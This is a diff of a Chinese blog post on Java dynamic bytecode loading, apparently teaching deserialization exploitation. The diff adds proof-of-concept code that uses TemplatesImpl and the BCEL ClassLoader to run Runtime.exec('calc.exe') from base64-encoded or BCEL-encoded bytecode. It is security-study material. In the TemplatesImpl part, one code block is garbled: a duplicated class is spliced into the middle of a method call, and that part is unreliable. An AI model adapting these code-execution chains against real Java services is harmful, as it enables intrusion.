@@ -596,7 +596,7 @@ public class Main &#123;
 &#125;
 </code></pre>
 <p>可是之前那样这样只是加载了字节码并不会初始化怎么办，就像之前提到过一样</p>
-<p>在getTransletInstance()方法中运行了defineTransletClasses()之后会newInstance();还是要这里的实例化才有用,就是这里就能触发我们之前加载的字节码了</p>
+<p>在getTransletInstance()方法中运行了defineTransletClasses()之后会newInstance();还是要这里的实例化才有用,就是这里就能触发我们之前加载的字节码了(所以为什么不跟进那个public方法一样因为不会初始化出来)</p>
 <pre><code class="java">   private Translet getTransletInstance()
         throws TransformerConfigurationException &#123;
         try &#123;
@@ -644,7 +644,9 @@ _class[i]怎么来的之前也知道了所以直接都串上了
 </code></pre>
 <p>至于外部加载类怎么写的弹计算器</p>
 <p>POC:</p>
-<pre><code class="java">import java.io.IOException;
+<pre><code class="java">package com.lagou;
+
+import java.io.IOException;
 import com.sun.org.apache.xalan.internal.xsltc.DOM;
 import com.sun.org.apache.xalan.internal.xsltc.TransletException;
 import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
@@ -662,15 +664,30 @@ public class io extends AbstractTranslet &#123;
     &#125;
 &#125;
 </code></pre>
-<p>解释以下为什么多了两个transform方法,然后将它编译+base64编码了</p>
+<p>解释以下为什么多了两个transform方法,然后将它编译+base64编码了javac io.java | cat io.class|base64</p>
 <pre><code class="java">这里是因为子类需要实现父类里面的抽象方法，同时因为父类是抽象类，可能没有将接口的方法全部实现，
 这时子类如果不是抽象的，那必须将其他接口方法都实现。
 这里面 `transform(DOM document, DTMAxisIterator iterator,SerializationHandler handler)
 是父类里面的抽象方法所以要重写
 transform(DOM document, SerializationHandler[] handlers)是父类没有实现接口的方法所以要重写
 </code></pre>
-<pre><code class="java">//脚本献上
+<pre><code class="java">//poc
 package com.lagou;
+
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import java.lang.reflect.Field;
+import java.util.Base64;
+
+
+public class Main &#123;
+    public static void main(String[] args) throws Exception &#123;
+        byte[] code = Base64.getDecoder().decode(&quot;”);
+        TemplatesImpl mpl =new TemplatesImpl();
+        Class a = mpl.getClass();
+        setFieldValue(mpl,&quot;_name&quot;,&quot;baicany&quot;);
+        setFieldValue(mpl,&quot;_bytecodes&quot;,new byte[][]&#123;code&#125;);
+        setFieldValue(package com.lagou;
 
 
 import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
@@ -681,25 +698,23 @@ import java.util.Base64;
 
 public class Main &#123;
     public static void main(String[] args) throws Exception &#123;
-        byte[] code = Base64.getDecoder().decode(&quot;yv66vgAAADQAIQoABgASCQATABQIABUKABYAFwcAGAcAGQEA&quot; +
-                &quot;CXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RP&quot; +
-                &quot;TTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0&quot; +
-                &quot;aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCm&quot; +
-                &quot;KExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29y&quot; +
-                &quot;Zy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2Fw&quot; +
-                &quot;YWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxp&quot; +
-                &quot;bml0PgEAAygpVgEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwADgAPBwAb&quot; +
-                &quot;DAAcAB0BABNIZWxsbyBUZW1wbGF0ZXNJbXBsBwAeDAAfACABABJIZWxsb1RlbXBsYXRlc0ltcGwB&quot; +
-                &quot;AEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFj&quot; +
-                &quot;dFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5z&quot; +
-                &quot;bGV0RXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3Ry&quot; +
-                &quot;ZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5n&quot; +
-                &quot;OylWACEABQAGAAAAAAADAAEABwAIAAIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAAIAAsA&quot; +
-                &quot;AAAEAAEADAABAAcADQACAAkAAAAZAAAABAAAAAGxAAAAAQAKAAAABgABAAAACgALAAAABAABAAwA&quot; +
-                &quot;AQAOAA8AAQAJAAAALQACAAEAAAANKrcAAbIAAhIDtgAEsQAAAAEACgAAAA4AAwAAAA0ABAAOAAwA&quot; +
-                &quot;DwABABAAAAACABE=&quot;);
+        byte[] code = Base64.getDecoder().decode(                &quot;yv66vgAAADQAIQoABgATCgAUABUIABYKABQAFwcAGAcAGQEABjxpbml0PgEAAygpVgEABENvZGUB&quot; +
+                &quot;AA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQAJdHJhbnNmb3JtAQByKExjb20vc3Vu&quot; +
+                &quot;L29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hl&quot; +
+                &quot;L3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWBwAbAQCmKExj&quot; +
+                &quot;b20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9h&quot; +
+                &quot;cGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNo&quot; +
+                &quot;ZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEAClNvdXJj&quot; +
+                &quot;ZUZpbGUBAAdpby5qYXZhDAAHAAgHABwMAB0AHgEABGNhbGMMAB8AIAEADGNvbS9sYWdvdS9pbwEA&quot; +
+                &quot;QGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0&quot; +
+                &quot;VHJhbnNsZXQBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFu&quot; +
+                &quot;L2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApn&quot; +
+                &quot;ZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0&quot; +
+                &quot;cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAUABgAAAAAAAwABAAcACAACAAkAAAAuAAIAAQAA&quot; +
+                &quot;AA4qtwABuAACEgO2AARXsQAAAAEACgAAAA4AAwAAAAoABAALAA0ADAALAAAABAABAAwAAQANAA4A&quot; +
+                &quot;AgAJAAAAGQAAAAMAAAABsQAAAAEACgAAAAYAAQAAAA8ACwAAAAQAAQAPAAEADQAQAAIACQAAABkA&quot; +
+                &quot;AAAEAAAAAbEAAAABAAoAAAAGAAEAAAASAAsAAAAEAAEADwABABEAAAACABI=&quot;);
         TemplatesImpl mpl =new TemplatesImpl();
-        Class a = mpl.getClass();
         setFieldValue(mpl,&quot;_name&quot;,&quot;baicany&quot;);
         setFieldValue(mpl,&quot;_bytecodes&quot;,new byte[][]&#123;code&#125;);
         setFieldValue(mpl,&quot;_class&quot;,null);
@@ -711,9 +726,63 @@ public class Main &#123;
         field.setAccessible(true);
         field.set(obj, Value);
     &#125;
+&#125;mpl,&quot;_class&quot;,null);
+        setFieldValue(mpl,&quot;_tfactory&quot;,new TransformerFactoryImpl());
+        mpl.newTransformer();
+    &#125;
+    public static void setFieldValue(Object obj, String fieldName, Object Value) throws Exception &#123;
+        Field field = obj.getClass().getDeclaredField(fieldName);
+        field.setAccessible(true);
+        field.set(obj, Value);
+    &#125;
 &#125;
 </code></pre>
-<h1 id="利用BCEL-ClassLoader加载字节码"><a href="#利用BCEL-ClassLoader加载字节码" class="headerlink" title="利用BCEL ClassLoader加载字节码"></a>利用BCEL ClassLoader加载字节码</h1><p>后面再写</p>
+<p>弹出计算器</p>
+<h1 id="利用BCEL-ClassLoader加载字节码"><a href="#利用BCEL-ClassLoader加载字节码" class="headerlink" title="利用BCEL ClassLoader加载字节码"></a>利用BCEL ClassLoader加载字节码</h1><p>关于BCEL先看看p神的：<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/where-is-bcel-classloader.html#0x01-bcel">https://www.leavesongs.com/PENETRATION/where-is-bcel-classloader.html#0x01-bcel</a></p>
+<p>BCEL属于Apache Commons项目下的一个子项目，全名应Apache Commons BCE，它提供了一系列用于分析、修改和创建Java Class文件的API，从库功能来看，使用性远不及其他库，但被Apache Xalan所使用，而Apache Xalan又是Java内部对于JAXP的实现，所以BCEL也被包含在了JDK的原生库中位com.sun.org.apache.bcel。</p>
+<p>JAXP全名是<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/JAXP">Java API for XML Processing</a> 是Java定义的⼀系列接⼝，⽤于处理XML相关的逻辑，包括DOM、SAX、StAX、XSLT等。Apache Xalan实现了其中XSLT相关 的部分，其中包括xsltc compiler。 xsltc compiler是⼀个命令⾏编辑器，可以将⼀个xsl⽂件编译成⼀个class⽂件或者jar⽂件</p>
+<p>XSLT（扩展样式表转换语言）是一种为可扩展置标语言提供表达形式而设计的计算机语言，主要用于将XML转换成其他格式的数据。既然是一门动态“语言”，在Java中必然会先被编译成Java，才能够执行。</p>
+<p><strong>BCEL包中有<code>com.sun.org.apache.bcel.internal.util.ClassLoader</code>类，它是一个<code>ClassLoader</code>，但重写了Java内置的<code>ClassLoader#LoadClass</code>方法</strong></p>
+<p>在LoadClass中，会判断类名是否是<code>$$BCEL$$</code>开头，如果是的话，将会对这个字符串进行<code>decode</code></p>
+<pre><code class="java">        if(clazz != null) &#123;
+          byte[] bytes  = clazz.getBytes();
+          cl = defineClass(class_name, bytes, 0, bytes.length);
+        &#125; else // Fourth try: Use default class loader
+          cl = Class.forName(class_name);
+      &#125;
+</code></pre>
+<p>调用deifine方法</p>
+<p>编写恶意类</p>
+<pre><code class="java">import java.io.IOException;
+
+public class calc&#123;
+    static  &#123;
+        try &#123;
+            Runtime.getRuntime().exec(&quot;calc.exe&quot;);
+        &#125; catch (IOException e) &#123;
+            e.printStackTrace();
+        &#125;
+    &#125;
+
+&#125;
+</code></pre>
+<p>然后通过BCEL提供的两个类<code>Repository</code>和<code>utility</code>来利用:</p>
+<pre><code class="mipsasm">Repository用于将一个Java Class先转换成原生字节码（也可以直接javac编译获得）提供了lookupClass⽅法⽤于加载⼀个类
+utility用于将原生字节码转换成BCEL格式的字节码
+</code></pre>
+<p>poc</p>
+<pre><code class="java">import com.sun.org.apache.bcel.internal.Repository;
+import com.sun.org.apache.bcel.internal.classfile.JavaClass;
+import com.sun.org.apache.bcel.internal.classfile.Utility;
+import com.sun.org.apache.bcel.internal.util.ClassLoader;
+import java.io.IOException;
+public class l &#123;
+public static void main(String[] args) throws Exception &#123;
+JavaClass clazz = Repository.lookupClass(calc.class);
+String code = Utility.encode(clazz.getBytes(), true);
+System.out.println(code);
+new ClassLoader().loadClass(&quot;$$BCEL$$&quot; + code).newInstance();
+</code></pre>
 
         </div>
         <!-- .entry-content -->
@@ -746,15 +815,15 @@ public class Main &#123;
           
             <div class="post-nepre full next">
           
-            <a href="/2023/07/10/cc1/" rel="next">
+            <a href="/2023/07/12/cc2/" rel="next">
               <div class="background">
-                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://baicany.github.io/images/a1.jpg" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://baicany.github.io/images/a1.jpg">
+                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://baicany.github.io/images/a15.jpg" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://baicany.github.io/images/a15.jpg">
               </div>
               <span class="label">
               Next Post</span>
               <div class="info">
                 <h3>
-                cc链1</h3>
+                java动态加载字节码</h3>
                 <hr>
               </div>
             </a>
